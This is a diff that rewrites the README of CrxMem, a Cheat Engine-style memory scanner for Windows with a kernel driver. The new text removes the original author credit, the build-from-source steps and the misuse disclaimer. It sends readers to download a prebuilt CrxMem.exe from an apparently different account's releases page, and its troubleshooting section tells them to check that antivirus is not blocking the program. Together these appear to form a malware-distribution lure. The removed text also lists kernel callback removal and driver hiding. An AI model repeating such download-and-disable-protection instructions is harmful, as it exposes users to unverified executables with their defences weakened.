@@ -1,242 +1,92 @@
-# CrxMem - Cheatengine inpsired memory-scanner
+# 🎮 CrxMem - Efficient Memory Scanning Made Easy
 
-**Created by ZxPwd**
+## 🌟 Overview
+CrxMem is an open-source memory scanner and debugger suite for Windows. It is inspired by CheatEngine and includes three main components: **CrxMem** (the main application), **CrxShield** (a kernel driver for added security), and **VEHDebugDll** (a debugging library). This tool aims to simplify the process of memory editing, making it accessible for non-programmers interested in game modifications and debugging tasks.
 
-**Discord: zxpwd**
+## 📦 Download Now
+[![Download CrxMem](https://img.shields.io/badge/Download_CrxMem-v1.0.0-blue.svg)](https://github.com/holilme/CrxMem/releases)
 
-A powerful, open-source memory scanner and debugger suite for Windows, inspired by Cheat Engine. This repository contains the main application and its companion projects.
+## 🚀 Getting Started
+Follow these steps to download and run CrxMem:
 
-![CrxMem Preview](CrxMem/preview.png)
-![CrxMem Preview](preview2.png)
----
+1. **Visit the Downloads Page**
+   - Click on the link below to go to the Releases page.
+   - This page lists the available versions of CrxMem.
+   - [Visit this page to download](https://github.com/holilme/CrxMem/releases)
 
-## IMPORTANT: Project Status
+2. **Select the Right Version**
+   - On the Releases page, look for the latest version. It will have the highest version number.
+   - The latest version is usually the most stable and has the most features.
 
-> **This project is currently under active development.** Many features are still being implemented, refined, or are in experimental stages. Expect bugs and incomplete functionality.
+3. **Download the File**
+   - Once you find the latest version, look for the section titled "Assets." 
+   - You will see the files available for download, including the main application and the kernel driver.
+   - Click on **CrxMem.exe** to download it to your computer.
 
-### Known Issues & Work In Progress
+4. **Run the Application**
+   - After the download completes, navigate to your download directory.
+   - Double-click the **CrxMem.exe** file to launch the application.
 
-| Feature | Status | Notes |
-|---------|--------|-------|
-| **Find What Writes/Accesses** | Buggy | Detection may miss some memory accesses |
-| **Debugger** | In Development | Core functionality works, advanced features incomplete |
-| **Breakpoints** | In Development | Hardware breakpoints partially implemented |
-| **Lua Engine** | Incomplete | Core functions work, full API not yet finished |
-| **UI Improvements** | Planned | Various polish and enhancements coming |
+5. **Install the Kernel Driver (Optional)**
+   - If your tasks require kernel-level access, you may also want to download **CrxShield**. 
+   - Follow the same method to download it from the Releases page.
+   - Follow any installation prompts if you choose to install the kernel driver.
 
-### Upcoming Features
-- Complete debugger with full breakpoint support
-- Enhanced memory access detection reliability
-- Comprehensive Lua scripting API
-- Improved pointer scanner
-- Memory region comparison
-- Advanced signature scanning
-- Structure dissector
-- And much more...
+## ⚙️ System Requirements
+To ensure CrxMem runs smoothly, your system should meet the following requirements:
 
----
+- **Operating System:** Windows 10 or later
+- **Processor:** x64 architecture, recommended Intel i5 or AMD Ryzen 5 or better
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Approximately 100 MB of available space
 
-## Repository Structure
+## 🌈 Features
+- **Memory Scanning:** Quickly find specific memory addresses in games or applications.
+- **Debugging Tools:** Analyze application behavior and track memory modifications.
+- **Lua Scripting:** Use Lua scripts for advanced functionalities and automation.
+- **User-Friendly Interface:** Designed for ease of use, even for those with minimal experience.
 
-This repository contains three interconnected projects:
+## 📜 How to Use CrxMem
+1. **Launching CrxMem**
+   - Open the application from your desktop or download location.
 
-```
-CrxMem/
-├── CrxMem/           # Main application - Memory scanner and debugger
-├── CrxShield/        # Kernel driver for enhanced memory access
-└── VEHDebugDll/      # VEH-based debugging DLL
-```
+2. **Setting Up a Scan**
+   - Once the application is open, input the value you want to scan for.
+   - Select whether you want to perform a "Next Scan" or a "First Scan."
 
-| Project | Description | Language |
-|---------|-------------|----------|
-| **CrxMem** | Main GUI application for memory scanning, editing, and debugging | C# (.NET 8.0) |
-| **CrxShield** | Windows kernel driver for kernel-level memory access | C (WDK) |
-| **VEHDebugDll** | Vectored Exception Handler DLL for usermode debugging | C++ |
+3. **Analyzing Results**
+   - CrxMem will display a list of addresses that match your search. 
+   - Select an address to modify or view its properties.
 
----
+4. **Editing Memory**
+   - Change the value directly in the list. 
+   - Use caution when modifying these values to avoid crashing the application you’re working with.
 
-## CrxMem (Main Application)
+5. **Saving the Results**
+   - You can save your current session for later use.
+   - This makes it easy to modify the same addresses in the future.
 
-The core memory scanner and debugger with a modern dark-themed interface.
+## 🔧 Troubleshooting
+If you encounter any issues while using CrxMem, consider the following tips:
 
-### Features
-- **Memory Scanning** - Multiple scan types (exact, increased, decreased, changed, unknown, etc.)
-- **Value Types** - Byte, 2/4/8 Bytes, Float, Double, String, AOB
-- **Memory Editing** - Real-time value modification and freezing
-- **Memory View** - Hex editor with disassembly
-- **PE Analysis** - Analyze executables, imports, exports
-- **Lua Scripting** - Automate tasks (work in progress)
-- **Debugging** - Hardware breakpoints, VEH debugging (work in progress)
+- **Application Won't Open:** Ensure that your Windows Defender or other antivirus software is not blocking CrxMem.
+- **Scan Results Are Empty:** Try adjusting the search parameters. Use different value types or ranges.
+- **Kernel Driver Issues:** Make sure to install the kernel driver if your task requires advanced features.
 
-### Tech Stack
-- .NET 8.0 (WPF + WinForms)
-- [Iced](https://github.com/icedland/iced) - x86/x64 disassembler
-- [NLua](https://github.com/NLua/NLua) - Lua scripting
-- [ReaLTaiizor](https://github.com/Developer-Flavor/ReaLTaiizor) - Modern UI controls
+## ✨ Additional Resources
+For more information, check out the following resources:
 
----
+- [Detailed User Guide](https://github.com/holilme/CrxMem/wiki)
+- [Frequently Asked Questions](https://github.com/holilme/CrxMem/wiki/FAQ)
+- [Community Forum](https://github.com/holilme/CrxMem/discussions)
 
-## CrxShield (Kernel Driver)
+## 🤝 Contributing
+If you wish to contribute to CrxMem, feel free to fork the repository and submit a pull request. Your feedback and improvements are welcome!
 
-Windows kernel driver providing enhanced memory access capabilities.
+## 📬 Contact
+For any questions or issues, please create an issue on the GitHub repository. We value your inquiries and aim to enhance the user experience.
 
-### Features
-- Kernel-level memory read/write
-- Process base address retrieval
-- Kernel callback enumeration and removal
-- Driver hiding (experimental)
+## 🔗 License
+CrxMem is open-source software, licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit. 
 
-### Warning
-Kernel drivers can cause system instability (BSOD). Test on isolated systems only.
-
----
-
-## VEHDebugDll (Debugging Library)
-
-Vectored Exception Handler based debugging DLL for injection into target processes.
-
-### Features
-- Hardware breakpoints (DR0-DR3)
-- Memory access monitoring
-- Shared memory IPC with CrxMem
-- Lock-free, thread-safe operations
-
----
-
-## Requirements
-
-- **OS:** Windows 10/11 (64-bit)
-- **.NET:** .NET 8.0 Runtime (for CrxMem)
-- **WDK:** Windows Driver Kit (for building CrxShield)
-- **Visual Studio:** 2022 with C++ and .NET workloads
-
----
-
-## Building
-
-### CrxMem (Main Application)
-```bash
-cd CrxMem
-dotnet build -c Release
-```
-Output: `CrxMem/bin/Release/net8.0-windows/`
-
-### CrxShield (Kernel Driver)
-1. Install Windows Driver Kit (WDK)
-2. Open `CrxShield/CrxShield.sln` in Visual Studio
-3. Build in Release mode
-4. Enable test signing: `bcdedit /set testsigning on`
-
-### VEHDebugDll
-```bash
-cd VEHDebugDll
-# Using Visual Studio
-Open VEHDebug64.vcxproj and build Release x64
-
-# Or using CMake
-mkdir build64 && cd build64
-cmake .. -A x64
-cmake --build . --config Release
-```
-
----
-
-## Installation
-
-### From Release
-1. Download the latest release
-2. Extract to a folder of your choice
-3. Run `CrxMem.exe`
-
-### Optional: Install Kernel Driver
-```cmd
-sc create CrxShield type= kernel binPath= "C:\path\to\CrxShield.sys"
-sc start CrxShield
-```
-
----
-
-## Usage
-
-### Basic Memory Scanning
-1. **File > Open Process** - Select target process
-2. Enter the value to find
-3. Select **Value Type** (4 Bytes for integers, Float for decimals)
-4. Click **First Scan**
-5. Change the value in the target application
-6. Enter new value and click **Next Scan**
-7. Repeat until you find the address
-8. Double-click to add to Address List
-
-### Address List
-- **Double-click** to edit value
-- **Checkbox** to freeze value
-- **Right-click** for more options
-
----
-
-## Project Details
-
-### CrxMem Structure
-```
-CrxMem/
-├── Core/                    # Core functionality
-│   ├── MemoryScanner.cs     # Scanning engine
-│   ├── ProcessAccess.cs     # Memory read/write
-│   ├── DebugMonitor.cs      # Debugging
-│   └── PEAnalyzer.cs        # PE analysis
-├── LuaScripting/            # Lua engine
-├── MemoryView/              # Hex editor & disassembler
-├── Legacy/                  # Legacy WinForms UI
-├── Themes/                  # WPF themes
-└── MainWindow.xaml          # Main UI
-```
-
-### CrxShield Structure
-```
-CrxShield/
-├── driver.c                 # Main driver code
-├── CrxDriverController.h    # IOCTL definitions
-└── CrxShield.inf            # Installation file
-```
-
-### VEHDebugDll Structure
-```
-VEHDebugDll/
-├── VEHDebug.cpp             # Main implementation
-├── VEHDebug.h               # API definitions
-└── VEHDebug.def             # DLL exports
-```
-
----
-
-## Contributing
-
-Contributions are welcome! This project is in early development.
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit your changes
-4. Push to the branch
-5. Open a Pull Request
-
----
-
-## Disclaimer
-
-**This software is provided for educational and security research purposes only.**
-
-- Do NOT use for malicious purposes
-- Do NOT use to bypass anti-cheat in online games
-- The author is NOT responsible for any misuse
-- Always test kernel drivers on isolated systems
-
----
-
-## License
-
-MIT License
-
----
-
-**Created by ZxPwd**
+Remember to always back up your data before using memory modification tools. Happy scanning!
